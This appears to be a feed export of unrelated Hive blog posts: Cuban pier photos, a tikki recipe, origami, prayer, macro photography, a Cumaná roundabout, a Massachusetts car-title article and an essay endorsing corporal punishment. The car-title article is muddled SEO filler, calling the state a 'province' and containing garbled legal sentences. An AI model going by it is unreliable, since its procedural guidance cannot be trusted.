![](https://i.ecency.com/DQmaVxX4wYmZFEJUsZjWzyzdAvPEhunnqDneCgjabTsAESh/20260522_173311.jpg)

![](https://i.ecency.com/DQmdqdS6QM1HHj5Zpi7Mn6xWHYmXxrrzTGSMTjZC86DU73S/20260522_173341.jpg)

![](https://i.ecency.com/DQma2kZuUD5hU7SeNbuL31f9gfwTB8YpT9L45EeiRW5Jh6V/20260522_173349.jpg)

La naturaleza como siempre comienza a cobrar el espacio que le fue tomada, más cuando el ser humano cubre los espacios con el desuso. sin embargo en esta soledad y olvido he podido encontrar el arte más sublime para el lente de mi teléfono.
![](https://i.ecency.com/DQmWREB2ZZrpfwRTapHKRGqmXXqVPZx1tWgvkwjofHZ5kCL/20260522_173416.jpg)

![](https://i.ecency.com/DQmVsNuprsSc5azF4PnM86kiJj5keoEFekPAtXtE97uMXt6/20260522_173429.jpg)

![](https://i.ecency.com/DQmUiYYNqwPqhzUdbLkLPP4y6AAQ7fDjhZBcR6dVZiBLq7D/20260522_173507.jpg)

![](https://i.ecency.com/DQmSWvAemtpeCNfsULebgtSHN9XPtSAVkidgyS15r63fK1X/20260522_173541.jpg)

Cuando comencé a tomar las fotos del muelle, percibí que algunas personas aún viene a este lugar para disfrutar de su tranquilidad y realizar actividades de pesca, una acción tan antigua como el propio ser humano.
![](https://i.ecency.com/DQmcBsJ5ydNz2mDrANfGHorxjUqQC7Efnr6RyVNw3thVmpi/20260522_173602.jpg)

![](https://i.ecency.com/DQmTGrZLCCASuJKn4A7iP8tQsznkMgYKLFsRtL8XipdFGse/20260522_173609.jpg)

Como ocurre en los lugares en los que no se realiza mantenimiento el oxido ha compensado a corroer los cimientos.
![](https://i.ecency.com/DQma7K5r1XB9yGg72t1CqCHB7UrLYoi5T8isRz8PGJtjDYp/20260522_173622.jpg)

![](https://i.ecency.com/DQmbQWWJeftTysQzrJw6yV64NBbpUB5v6CaumZVnWtvykiy/20260522_173639.jpg)

![](https://i.ecency.com/DQmbXJK3WQWG8jiRJbg3APd6Gn9Z2agSj7NcHNCUBNrw3dB/20260522_173647.jpg)

Recuerdo que mi madre me traía a esta playa cuando veníamos de visita a casa de una de mis tías que aún vive en esta barriada. Incluso muchas veces tomamos diferentes barcos hacia la Ciudad Nuclear u otro que estaba dedicado a las actividades al aire libre y que pertenecía a una asociación de esparcimiento que ya no existe y que era conocida con el nombre de SEPMI.
Esta pieza oxidada me recuerda los nudos de amarre que ayudaban a los barcos a atracar.
![](https://i.ecency.com/DQmZm6JpxQFBQ1GUYUDGwENn7aZeiLFzgS3eMuomW75txEK/20260522_173833.jpg)

![](https://i.ecency.com/DQmV8i2DdQmwEKgK9QBbVWKNRmaTPspLjwW8NbS4JEcLsPC/20260522_173847.jpg)

![](https://i.ecency.com/DQmWUT746M4KgYV2JKjQRonNBxmg7T4Mu7WJ42rK1TnEDRC/20260522_173907.jpg)

![](https://i.ecency.com/DQmdvZDRfcapgy36NJFTbMFxaDTkhi1REtdxVVonnpmnFYf/20260522_173919.jpg)

También existían torres de luz que ya desaparecieron, esta imagen parece salida de otro planeta, como si fueran montañas en un desierto maldito.
![](https://i.ecency.com/DQmSFyFLWPK48j7EfDzcPTRzp1HVUsWMLd7Z3MfQf7YhFJS/20260522_174126.jpg)
 Luego el mar, ese hermoso espacio que a veces nos hace sentir tan pequeño, tan esmirriado ante tanto poder y belleza. Espero algún día poder tomar fotos submarinas y deleitarme con la belleza de la inmensidad de las aguas.
![](https://i.ecency.com/DQmfDThxs3gMbLwoMUpZA3c1FoHVQceeaZvhVSY47Zu5KK9/20260522_174144.jpg)

No pude dejar de tomar estas fotos que nunca pueden faltar en un muelle y en una ciudad que vive dentro del mar. Los hilos de pesca, o la pesca a la usanza más tradicional en Cuba, sin varas de pesca y con toda la tranquilidad del mundo para esperar a que llegue el pez adecuado o el destinado.
![](https://i.ecency.com/DQmTKJfZHFKxi5LCuDdrxi9orDHNQs7jkjS4Xa5afx2VdDb/20260522_174255.jpg)

![](https://i.ecency.com/DQmNzsutnqdE4cscK1za5cnncbJ167hUkhmdAT7St1NG4BW/20260522_174315.jpg)

![](https://i.ecency.com/DQmVzZf3cnDXdPfU2EigXAMJBhRWhHZU7exoitLHuVah61G/20260522_174440.jpg)

![](https://i.ecency.com/DQmRdG3qQva7N3jftMCPWxYgY9Loh2JkT63Jy5rpuasqAww/20260522_174501.jpg)

![](https://i.ecency.com/DQmXpzin2QkGoeWv2m6E4r7PEn1cLQD9QWezTAkDkARCWLg/20260522_174517.jpg)

![](https://i.ecency.com/DQmYT1TzrNA3E7JLHqP2Dk2DiXsG6e5MuAsK25soXaiHUv3/20260522_174556.jpg)

![](https://i.ecency.com/DQmZsoUpvKaghEAzggRokEhivi3dhWyz1YQickqg5wi3swZ/20260522_174640.jpg)

![](https://i.ecency.com/DQmXAGVCJFsCp4EEptwu65dN5xKHLwe7wbjLG6y5SoFVWhS/20260522_174901.jpg)

![](https://i.ecency.com/DQmbGgqhumt26MQHkjtKzuYTeprZvoDBQUyqminGTcg8WeG/20260522_174911.jpg)
Cuando me decidía a retirarme, un perro y su dueño disfrutaban del espacio. Espero que estas fotos les hayan gustado.
![](https://i.ecency.com/DQmSc7JwGNfhUMw5Wywv3gQkhRwF3jo366vaiZUD2UNGYAt/texto_12_.jpg)

<center>![](https://i.ecency.com/DQmZgEYwbWXsPtnALCquFf8frbap3fDb9s56qGhCcPDj5KD/_al_nhyamar78_1_.jpg)</center>

狗是人类最忠诚的朋友，它们总是用无条件的爱和温暖回报我们。看到狗狗欢快地摇尾巴、兴奋地奔跑，仿佛一切烦恼都烟消云散。与它们在一起的时光，总是充满了快乐与宁静，狗狗不仅是伙伴，更是一种心灵的慰藉。无论生活有多忙碌，和狗狗一起散步、玩耍的瞬间，都是我最享受的时光。

title.title: Freshly Baked Sweet Tikki – A Traditional Tea Time Favorite
title.body:
![](https://i.ecency.com/DQmQndzgvghtZyjRd7sbo3nbdu5LjXdQaf6DE8Xxb5SdeiZ/1779646082298.jpg)
___
# Hello foodie's!
___
Hey friends, how are you all? I hope you all are fine. I am also fine. So friends today I have come again with a new blog and today I shared the recipe of one traditional snack/biscuit from my culture which we call tikki or naan roghani. We eat it in breakfast with milk tea and it becomes very delicious. And guys you all gave me a very good response on my potato patty burger recipe blog, thank you so much for that, it means a lot. So guys now without wasting much time let’s start making this delicious breakfast snack.
___
# Ingredients needed
___
Flour
Sugar
Ghee
Egg
Yeast
Baking soda
Salt
Star anise
Cardamom
___
# Making process
___
So guys to make tikki, first take a bowl and add 10 cups flour in it. Then take a pot and add 2 cups sugar and 3 cups water in it. Now place it on the stove until the sugar melts properly in the water. Now in another pot add 1 and a half cup ghee and melt it too.
___
![](https://i.ecency.com/DQma69NLEjTzDZicPwAXSqmW2B28zdJPDdnnXAMiX9qQF2i/1779466212292.jpg)

![](https://i.ecency.com/DQmW36HRnvHCkp9BpQpq5iowCwcQu9iCtuZpUfkGQDnDQTN/1779466212407.jpg)

![](https://i.ecency.com/DQmW8dYJ5gk5JBTmwx8B5yWsszEizzChn9Hcn1eHZgYJvQH/1779466212519.jpg)

![](https://i.ecency.com/DQmWpK1bBvfTWax4imqirsNAHQb9vqSZWfoqYu5eE6mbTx9/1779466212613.jpg)

![](https://i.ecency.com/DQmSkbkZkXNZXGtPRFoHe2doevhwvFi9wahYo5T7ZLS6Reu/1779466212707.jpg)

![](https://i.ecency.com/DQmc3xrsdU3J7u3SXi3MvHALaCkKKKpdVRorR2dmi8CCe9j/1779466246553.jpg)

![](https://i.ecency.com/DQmfB5fVpLiwQ6JYHPKQFCSSf5erzevfAPdu4g1zGjRB99k/1779466246651.jpg)

![](https://i.ecency.com/DQmdZRK3cqPMQkDHtpYrfy5WyzFJK4e2gJTapEtGBVMosze/1779466246761.jpg)
___
Now add the ghee little by little into the flour and mix it properly. It was not mixing well in the bowl so I transferred it into another thing and kept mixing it properly while adding ghee. At the end when we press the flour in our fist and if it holds the fist shape, it means we added a good amount of ghee.
___
![](https://i.ecency.com/DQmUPNuXJpgYBkSV8G1HGGoJgEWmwCvjAWETKhnjHy8EbEi/1779466246865.jpg)

![](https://i.ecency.com/DQmVxXkR7LBsK2qnVHQm68scv58NvBTiqJ6MwewoNDpNbBR/1779466246986.jpg)

![](https://i.ecency.com/DQmSCAuhnHtuJXTc1E3KJQteVCqARWTsCULjU68SWtRBRNq/1779466275232.jpg)

![](https://i.ecency.com/DQmRrvZDhyZTdh68XJQebCTWKnpLRXArqzCZavHtMLYDgf3/1779466275386.jpg)

![](https://i.ecency.com/DQmXv6KUjXL1zFEm9UUqy32B9RfRw99xPbWUQGZxmXjsJ5w/1779466275499.jpg)

![](https://i.ecency.com/DQmYziNNJyH9G7jkNuJ9TFV8k9q6HP7xbh4A8rFszFS462F/1779466275613.jpg)

![](https://i.ecency.com/DQmZNmc4UZ9p2MaZGSXB3BwpJYPikHcmgn2VR3zV2SXsh5H/1779466275740.jpg)
___
After this I again transferred the flour into a bowl and then added 2 eggs in it and mixed it properly too. After this I added 1 and a half tablespoon yeast, 1 and a half tablespoon cardamom, 1 tablespoon star anise, half teaspoon salt and half teaspoon baking soda. After adding all these things, I mixed them properly and then transferred it into a bigger pot because the bowl became too small.
___
![](https://i.ecency.com/DQmPEQ2DwH1Ej39sGMRAUuL7TgL9zgMTbZrtyy2TzCfGoUB/1779466351522.jpg)


![](https://i.ecency.com/DQmdMko6gDbCfkAAE6HHkASTuvc3vZWwKTKsQei597nUstj/1779466392720.jpg)


![](https://i.ecency.com/DQmYSn1ncSMf3sPnRWTfCNB5AnVjexkCef2FqaKB5w6Ghkx/1779466351685.jpg)

![](https://i.ecency.com/DQmcGai5yF6RcDsMejz1333XviT3n6jqqN4x4QMibjREC5s/1779466351806.jpg)

![](https://i.ecency.com/DQmScvL7o8Rhi9umjbk3CJVYq4vrhTshNjUSA5NKGZVZPRm/1779466351930.jpg)

![](https://i.ecency.com/DQmWHyHz3bv4b9AnSgm7zxvjcuMk3AwLncbScscGE9PvZUE/1779466436998.jpg)

![](https://i.ecency.com/DQmPm4sEygDsM8J7oRjQaLdKkLWbEgF9SF2AcMLKsusFpfv/1779466437104.jpg)

![](https://i.ecency.com/DQmbB5GEHR6TF3LMd6wyKReAs4X5mxL381VAD3ah9pU4MvS/1779466437217.jpg)

![](https://i.ecency.com/DQmPLmJP6rdyAeSyxWoj6xvPtd8jWMXDZQ7PcgjhxNrCshG/1779466437345.jpg)
___
# Kneading the dough
___
Now after this, the sugar water that I made earlier should be added little by little into this mixture and knead it properly for 10 minutes. After kneading it properly, cover it with the pot lid and give it rest for 2 hours.
___
![](https://i.ecency.com/DQmSyt1tscC8CH8Cyb5hDFemsLX3Zo7z9YVMaqL7BExKLy6/1779466437476.jpg)

![](https://i.ecency.com/DQmR9fmdqscW8zJoTiuweNQ61K4xUoRXRdj9HqUXiKboAwa/1779466512883.jpg)

![](https://i.ecency.com/DQmV4DhEZhBuQGbbMBL8c471xSvcXmGhqddEtJbMXxrJuqD/1779466512942.jpg)
___
# Cooking the tikki
___
Now after 2 hours preheat the pressure cooker for 10 minutes. Then I divided this flour mixture into 4 pieces and cooked them one by one. I made them round and flat and then made small holes in them with the help of a fork so they can cook properly. 
___
![](https://i.ecency.com/DQmQHLUfQdF6Ryn7w1Yt35jgdHKEjbHdM1J3sCXsBAd88fX/1779466513042.jpg)

![](https://i.ecency.com/DQmVmDcTazYb5QPj8M7aFdTBJXtoctTVKdWqXvkNhQtJt4E/1779466513151.jpg)

![](https://i.ecency.com/DQmRvY9JWM5EAvk6ALNng4kknE5HHFviSzi5rKhtsRoAjDF/1779466513272.jpg)

![](https://i.ecency.com/DQmbyrKi5HmMbURjDJjGTRPDDe27d2xuL3Qocn1PxKZQnt5/1779466535703.jpg)
___
At the end I applied egg yolk on top of them. Then I kept them in the preheated pressure cooker on low flame for 1 hour so they cook properly. By the way you can also make it in the oven but our oven became broken so that is why I made it in the pressure cooker.
___
![](https://i.ecency.com/DQmVq9H5aWRJo2ptePX7x789LsDG6v8oJV5spKckq6AbE6z/1779466535817.jpg)

![](https://i.ecency.com/DQmSkMFUjTvBoJrsVyar9FvFPrA5wub5XTWuRAZTbpTsA1c/1779466535935.jpg)

![](https://i.ecency.com/DQmccy3DiVz8WuotjfsfikH99eqRJDASRvpmLpjeJXUA6U6/1779466536057.jpg)

![](https://i.ecency.com/DQmPasotCbESVBZJWDiWNTFWr4WiDe5hXp47ZezQ4enDXjL/1779466536161.jpg)


![](https://i.ecency.com/DQmUDj1oQxsWseYDfyDRKxVaKXqHCZkkJ8PDXbNcuTR3VXN/1779644762136.jpg)
___
# Final result 😋
___
So friends after one hour our yummy and delicious sweet tikki is ready. I enjoyed it in breakfast with milk tea and it became very delicious. So guys if you liked my today’s recipe then please tell me in the comments section and support me like always thank you so much and bye bye. 💛
___
![](https://i.ecency.com/DQmdbQuFRQoQL4uGdSDZ2npTt6V7aqajew4jYswCzwWY8ZK/1779466855880.jpg)

![](https://i.ecency.com/DQmWKDG5PQdLxfwTXoNf7WHTZQo8f2ZZiKKnohiFJXprivg/1779466855998.jpg)

![](https://i.ecency.com/DQmXuK4dPygGtpkq62oCdcd9MUDgaoQSFdJCnSKDi1wFW4i/1779644689145.jpg)
___
***That’s all for today. I will be back soon with something new to share. Until then, stay happy and keep supporting*.**
___

title.body:
![image.png](https://images.hive.blog/DQmQY3xPSXxz2kT2x8YajV9SSuzjvpUvQCwKLZ7FdovEVNt/image.png) Mi fin de semana fue muy tranquilo y me puse a trabajar en una figura de papel para mi colección y al final me llevé una gran sorpresa al terminar el origami y es que al lado aparece una pequeña sombra sobre la mesa, como si el conejar tuviera un acompañante y ambos posando para la fotografía. La fotografía es sencilla, pero lo que me llama la atención es como algo puede cambiar dependiendo de la luz. Aquí el origami está firme sobre la mesa, pero detrás de eso hay algo escondido que sirve perfectamente para acompañar a la figura original. >My weekend was very quiet, so I started working on a paper figure for my collection. When I finished the origami, I was in for a big surprise: there was a small shadow on the table next to it, as if the rabbit had a companion and they were both posing for the photo. The photo is simple, but what catches my attention is how something can look different depending on the light. Here, the origami stands firmly on the table, but behind it there’s something hidden that serves perfectly as a companion to the original figure. ![image.png](https://images.hive.blog/DQmYPvjP9fWyKj4T8ym35m6Eo828gsHUARXCzz7hW5uv9Qp/image.png) Las sombra en ese caso es lo que resalta y se lleva el protagonista, donde el origami y la sombra cada uno cuenta una historia, para así poder crear una gran combinación en una sola escena. En este caso el conejo de papel es una manualidad y la sombra proyecta firmeza. Por ende paso de estar tranquilo, quieto a estar abajo la luz acompañado de una sombra. En ese caso las sombras siempre estarán presente en cada momento, porque nos recuerdan que incluso las cosas más simples tienen un acompañante, que solo está cuando la luz aparece. >In this case, the shadow is what stands out and takes center stage, where the origami and the shadow each tell a story, creating a powerful combination within a single scene. Here, the paper rabbit is a craft, and the shadow conveys strength. Thus, it transitions from being calm and still to standing beneath the light, accompanied by a shadow. # >In this case, shadows will always be present at every moment, because they remind us that even the simplest things have a companion, one that is only there when the light appears. ![image.png](https://images.hive.blog/DQmSfiLnatJmhSkBSuALYnZ1LnbjwMCqmERmk1JGEVXm7Sy/image.png)

title.title: MCGI Topic Review | What is the proper way to pray
title.body: > https://youtu.be/ZujlEaC3nbg?si=U3rzBLNx763WFY_Q One of the most amazing gifts that God gave to His children is prayer. It's a means of communicating with Him, of thanking Him, of asking for His guidance and of pouring out our hearts before Him. The right way to pray is not to use a lot of words or to talk a lot. Rather, it is a matter of coming to God in sincerity, humility, faith and obedience. God does not listen to the person's prayer if he doesn't have a right heart. Matthew 6:9-13 is referred to as the Lord's Prayer, and it is here that the Lord Jesus teaches His disciples how to pray. This prayer taught us that we should first honor God by praying “Our Father which art in heaven, Hallowed be thy name.” This is a lesson for me in prayer, to start with reverence and respect for God. We should acknowledge His greatness before bringing our requests before Him. Jesus also spoke about not praying to be noticed. In Matthew 6:5, He said that hypocrites love to pray publicly so that others can see them. A sincere heart that prays, but does not seek human acclaim is the hallmark of a true prayer. Another important aspect of proper prayer is faith. The Bible says in Hebrews 11:6, “For he that cometh to God must believe that he is, and that he is a rewarder of them that diligently seek him.” In every prayer I pray, I should always remember that God hearing me and concern for my needs. When answers do not come right away, I must keep going on faith because His timing is always right. I have a personal experience in mind here that I am passing through a difficult time and feeling discouraged. There was a lot of things going on in my mind and I felt overwhelmed. I chose to pray instead of wallowing in sadness and suffering. I was talking with God like a friend and asked for His guidance and assistance. My situation didn't change overnight, but slowly I felt peace in my heart. My mind was struck with something I read in Philippians 4:6-7 saying, “Be careful for nothing; but in every thing by prayer and supplication with thanksgiving let your requests be made known unto God.” This experience helped me to understand that prayer is not just about getting answers but it's also about getting closer to God. Humility, sincerity, faith, thanksgiving and obedience to God's will are therefore required when one prays. The Bible instructs us to pray continually: 1 Thessalonians 5:17, “Pray without ceasing.” That prayer ought to be something that we do on a regular basis. When I pray as God has taught me, I rely on Him more and more and I trust in his love and care more and more. It is indeed a privilege that brings us closer to our Heavenly Father, to pray.

title.title: “Eroding”这个词让我想起了时间的流逝和事物的
title.body:
<center>![image](https://pixabay.com/get/gab1c129846ffedca6f2dcd43e48714e690ab945b8a3e4d7194496fd25c12cd927ac6b68d0376de9cc745df7b7213d261_640.jpg)</center>

***

“Eroding”这个词给我带来了些许沉思。它不仅仅指的是土地或山体的侵蚀，更像是一种时间和环境无情流逝的象征。随着时间的推移，我们的记忆、理想，甚至人际关系都有可能被生活的洪流所侵蚀。虽然这种变化有时让人感到惋惜，但也提醒我们珍惜当下，努力保护那些值得珍惜的东西。在这个过程中，我们也许能找到适应和重生的新方式。

title.title: The little snail and grasshopper I found on Monday that look so unique and cool
title.body:
>Hi everyone, how are you, my fellow macrophotography enthusiasts? I hope you are all having a great day and in good condition wherever you are. On this occasion, I went back to explore the small forest to look for small animal species, and every day I always hunt for small animal species in the forest, that's my daily activity, and when I arrived there, I immediately explored this small forest and hoped to find some small animal species.

\n\n

>And a few minutes later I found a small snail species crawling on one of the dry logs. At that time I saw a small snail walking very slowly on the log, and without waiting long I immediately took my Smartphone camera and macro lens and at that time I immediately approached it, and without waiting long I immediately took several different angles of pictures and looked very beautiful and graceful, and on this occasion I will again show some portraits of this small snail species, and you can see them below.

![1000102791.jpeg](https://files.peakd.com/file/peakd-hive/ridor5301/EopurbcV6QtwJVVxE6Ve62CqUgeVBTp7UCHafhhJ6hP8BDgzoxQpwxSZM1ME66LFMvd.jpeg) ![1000102769.jpeg](https://files.peakd.com/file/peakd-hive/ridor5301/Eos3fBhbFB4K9MsNGAuzSiMCYsS1efTHGXtuTWDpdygFDj8F4EuLPJ3ewZGszpaoZEG.jpeg) ![1000102748.jpeg](https://files.peakd.com/file/peakd-hive/ridor5301/EokfaEZ3kH4kcW1LtnAeaYmzGVTPoXSFS3q6TCeQ8pvAmCCj9gExFu396BX7xKaqmo6.jpeg) ![1000102786.jpeg](https://files.peakd.com/file/peakd-hive/ridor5301/EoputMMdwUS1faHVvRjR9ettfUL1zpthUc12WuMwr5eWvGPzgsQ6CQ5aFcZPGKbkvYJ.jpeg) ![1000102750.jpeg](https://files.peakd.com/file/peakd-hive/ridor5301/EoEryKx2LMNW7eBE11B9g96m6trWXygW5Yh7nvRRfxybZuQ2CzAfqxSXeCubo964t5B.jpeg) ![1000102733.jpeg](https://files.peakd.com/file/peakd-hive/ridor5301/EopuuSvWeA5Wbccs6ysRmp4ZS9yBw3cqYRbFvMWF15phXcemRpFmyT52EgAF6Ns3FjP.jpeg) ![1000102716.jpeg](https://files.peakd.com/file/peakd-hive/ridor5301/Eos3GZS1D4rBjq3mcGPYVqfR9dhj4aJMQFBfCiD32viKbGxdpLyt1JeeMu1CUredBuv.jpeg) ![1000102781.jpeg](https://files.peakd.com/file/peakd-hive/ridor5301/EouAgjyLZUQvf2pQ5KSFGAJrCYM8HpbGVgdzt2yxGqbbKztkLLWAZpy8QZ1bSEhL5EB.jpeg)

title.title: A Roadmap for Massachusetts Centralized Title Services
title.body:
![Car Title Deceased Owner in Virginia.jpg](https://waivio.nyc3.digitaloceanspaces.com/445ebf56ac415e456e892d46323496b81d206f75c5fcc988ce9226dd9f3adcdd)

HGV and operator license documentation are a challenging issue for business owners who relies on commercial vehicles and you are dealing with records information data storage. Your certificate of ownership is the final legal evidence that you own an automobile and it allows you to register the car, obtain required insurance, or ultimately sell the asset at a later time. Sadly, those essential hard copy documents get lost during the tumultuous residential move, inadvertently damaged or just plain lost in a mountain of household paperwork over the years. For when you find yourself short of this paperwork, knowing how to legally replace it is the only way forward. There are particular regulations regarding [car title recovery in Massachusetts](https://cartitles.com/massachusetts-car-title-lien-release/) and in case you do not follow them your legal rights may be restored but it may take time.

This jurisdiction does not have the luxury of decentralized local county clerks to handle motor vehicle records, and instead processes all ownership documents through a central entity known as the Registry of Motor Vehicles (RMV). All duplicate requests go to the main Title Division in Boston. You first want to know precisely the current status of your vehicle record, before you start filling out any applications. One of the biggest pitfalls that some humans face in this first lookup is locating an unreported financial lien. A lien is a legal right against an asset, which gives a lender hold over it until the auto loan is fully paid back. This is done by the bank updating the central database to remove its legal claim. RMV will issue a clean duplicate only if the legal security has been formally removed from the central data base.

In order to break free of this lingering financial shackle, you need a formal release from the original lender. This step is massively regulated by state rules, which are quite stringent. This lien release must be written on the official letterhead of the bank or financial institution and provide a clear statement that this loan has been paid in full. In addition, this letter should contain the year, make and full Vehicle Identification Number of the vehicle. Note that the Registry specifically prohibits photocopies or faxes for this requirement; only the original physical letterhead document will be accepted.

After clearing the lien, you can concentrate on the Application for Duplicate Certificate of Title. It must be filled out correctly, it is a standardized state form. You have to give the exact Vehicle Identification Number, the most recent mileage and your home address. Physical signing of document by all the owners as per original historical record. Once your paperwork is perfectly filed, you'll need to send the packet in with a twenty-five-dollar state processing fee. However, if you are opting for the more reliable mail-in path, then the fee must be paid by check or money order made out to Mass DOT.

**Conclusion**

Replacing lost automotive paperwork is an overwhelming experience at the Registry of Motor Vehicles in this province, or it certainly can be if you're not positive about what the RMV expects from you. Proactively researching any old financial holds, obtaining the necessary original lien releases on accurate bank letterhead, and completing your application with 100% accuracy will help you avoid unnecessary delays. Maintaining an untarnished, undebated title is the most effective safeguard for your investment; this will guarantee that your vehicle remains validly titled and entirely road-compliant.

title.title: Physical discipline shaped many of us into who we are today.
title.body: > ## Hello, everyone. I welcome you to my blog and another wonderful edition of the hive learner's featured post. Our world is changing and a lot of things that used to play a huge role both in the live of kids and adults are starting to become a thing of the past, some of the changes that is introduced into our world is actually affecting our world negatively while some are making positive impact. One of the changes bringing about negative impact is the Gen Z style of parenting which is completely contrary to how many of us were raised, the Gen Z want to only pamper their kids with no discipline and fail to understand that punishing your child when they are wrong does not mean you hate them. ![](https://i.ecency.com/DQmfSKQyk8QNb9G3KC6Xi97WTKbFHn6jJUyUyGLX4KL85fP/1779711307652.jpg) [Source](https://unsplash.com/photos/mother-scolds-her-daughter-who-is-sitting-on-the-bed-1vmDDf3-VvM) No doubt while growing up and our parents punished us for wrong deeds, we felt like they hated us, but that helped us know that doing that particular thing was wrong, and the fear of the rod or getting whipped again deterred us from doing that same wrong thing again. Trust me when I say we would have been indulged in a lot of wrong things as kids and while growing up, but when you remember the last time you were whipped for being involved in your last wrong deed, you will not find the courage to want to pass through such a thing again. Overtime it became a habit, we did not want to be involved in wrong doings, no longer because of the fear of getting whipped but because we have now come to realise that is the wrong thing to do and we should not in anyway be involved in it. Remember at first we don't want to be involved because of the fear of getting whipped before it developed to the point of not wanting to do it at all, so now when you raise your kids like the Gen Z parents are doing and preaching, what stops them at first?? What do they get scared of when they hear friends say let's do this or that which is a wrong thing to do? Do they agree to be a part of it? Or do they stop because they know how their parents will react to the situation? Gen Z parents now laugh over everything a child does, zero punishment for the child, some even go as far as recording the child in the act for social media post and then how will these children know that these acts are wrong and should not be done when the adults in their life laugh over the action or act? What do you think that tells them? It is more like a go ahead to do more which means that in the nearest future our world will be filled with children who cannot tell right from wrong because those who were supposed to impact that knowledge in them failed to do so. ![](https://i.ecency.com/DQmWtdMXW2LjGfFUAYMWgGKuCaKCvN7ppSSun5Buaz3kpFg/1779711307702.jpg) [Source](https://unsplash.com/photos/mother-scolds-crying-daughter-on-sofa-in-living-room-BsKIPa4AFOY) So yes, corporal punishment makes kids better when it is done when needed; some of our parents made the mistake of exercising corporal punishment both in cases that actually require just a word of advice or calm correction and those that actually did require corporal punishment, which is why many kids ended up traumatized.

title.title: Mi visita a la redoma el Indio, una llamativa escultura en la entrada de la ciudad [Esp / Eng]
title.body:
> **
ESPAÑOL
** Bendiciones abundantes y eternas para todos los miembros de esta comunidad de @worldmappin. Es un placer saludarlos y desearles un día feliz y lleno de bendiciones. Que las bendiciones de Dios inunden sus vidas. Hoy les comparto mi visita a la rotonda El Indio, ubicada a la entrada de la ciudad de Cumaná, en la Avenida Universidad. Rinde homenaje a la tribu indígena que habitaba esta región antes de la llegada de los españoles. La rotonda conecta la ciudad con una glorieta, y muy cerca de ella se encuentra otra importante escultura del héroe cumaná. Desde esta zona se puede apreciar la montaña, los hoteles de la playa en el sector San Luis, y en el centro de La Isla, hay varias plantas ornamentales y un jardín que recibe mantenimiento y cuidado constantes por parte de la Fundación Serviamsa, encargada del embellecimiento de la ciudad. Algunas de las plantas son bugambilias, palmeras, lirios, entre otras, que adornan esta importante vía. La montaña que se ve al fondo forma parte de la Cordillera Costera Oriental, una hermosa cadena montañosa que se extiende por los estados de Sucre, Anzoátegui y Monagas. Desde esta importante vía, la ciudad tiene acceso a Puerto La Cruz y otras poblaciones del estado de Anzoátegui.

> **
ENGLISH
** Abundant and eternal blessings to all members of this @worldmappin community. It's a pleasure to greet you and wish you a happy and blessed day. May God's blessings flood your lives. Today I'm sharing my visit to the El Indio roundabout, located at the entrance to the city of Cumaná on Avenida Universidad. This roundabout pays homage to the indigenous tribe that inhabited this region before the arrival of the Spanish. The roundabout connects the city to a traffic circle, and very close to it is another important sculpture of the Cumaná hero. From this area, you can see the mountain, the hotels on the beach in the San Luis sector, and in the center of La Isla, there are several ornamental plants and a garden that receives constant maintenance and care from the Serviamsa Foundation, which is in charge of the city's beautification. Some of the plants are bougainvillea, palm trees, lilies, among others that adorn this important thoroughfare. The mountain seen in the background is part of the eastern coastal mountain range, a beautiful mountain range that spans the states of Sucre, Anzoátegui, and Monagas. From this important thoroughfare, the city has access to Puerto La Cruz and other towns in the state of Anzoátegui. ![image.png](https://files.peakd.com/file/peakd-hive/virgilio07/EqFrYyiwn3Jgy4T8wz3vMuwLyPwpM1mFAhoz6ECo4xfi5o6qEfEUV4A1bQQBzGx6dL2.png) ![image.png](https://files.peakd.com/file/peakd-hive/virgilio07/Enuhv2hsseqQvNygBCj4V9Hqg6eLGaJndFPgwiCCwusMW82fkrSdXydQ6vYvGWP7s3w.png) ![image.png](https://files.peakd.com/file/peakd-hive/virgilio07/23yd3rcpZzdqyxP87nSY8H4ywYVNMvm3qfcaETqARC1AZRyQWmpcp83pz5AxnvpXn4UZG.png) ![image.png](https://files.peakd.com/file/peakd-hive/virgilio07/EqHzueJWi2QW4bBKiKNQhPkPiW9xgQcTtjgcCpP9E2ynW5JgafohZ9amZiukm97tFFw.png) ![image.png](https://files.peakd.com/file/peakd-hive/virgilio07/EokdcTVw6RbPHU1jzQvS33zGsS4eWK3FUYnBe3y3ZNHJCG6aYuXwhDaWtxxWarYcziW.png) ![image.png](https://files.peakd.com/file/peakd-hive/virgilio07/Eo8UHU2Dt5t8y8GVzREi7n5E8dYF7Y5DuW2zp6acEFBk6GXSJxiZ2WjHrGB9Rdvz2Lx.png) ![separador virgilio 1.gif](https://files.peakd.com/file/peakd-hive/virgilio07/48fPJW5oSR5NrT5insR3hayLh9ET1ifvCG8zGp4Rfk8EhMtUrcwakXhr5g3cRk6Y8x.gif)

> La rotonda se ubica en el centro de la intersección. Desde la distancia, se aprecian las plantas, la fuente y las palmeras en el paseo central. A continuación, se observa una hilera de nenúfares y el panel azul que controla la fuente. La figura indígena se encuentra en el centro, flanqueada por esculturas de peces marrones. Varias frases están inscritas en la fuente, entre ellas «Cumaná Heroico». Se puede apreciar el panel, las plantas circundantes y el paseo de concreto que conduce a la fuente. Siguiendo por el sendero, se observa parte de la avenida a ambos lados y las plantas que adornan este largo paseo, o isleta, entre las calles. Otra frase, «Cumaná Heroico», se encuentra detrás de la fuente. Frente a la fuente, se puede ver la figura indígena sosteniendo un pez, un animal curioso, y las tuberías grises que la rodean.

>

 
The roundabout is located in the center of the intersection. From a distance, you can see the plants, the fountain, and the palm trees in the central walkway. Then you see a row of lily pads and the blue-painted panel that controls the fountain. The indigenous figure is in the center, flanked by brown fish sculptures. Several phrases are inscribed on the fountain, including \

We have a view of the panel, the surrounding plants, and the concrete walkway leading to the fountain.\n\nContinuing along the path, you can see part of the avenue on both sides and the plants that adorn this long walkway, or island, between the streets. Another phrase, \

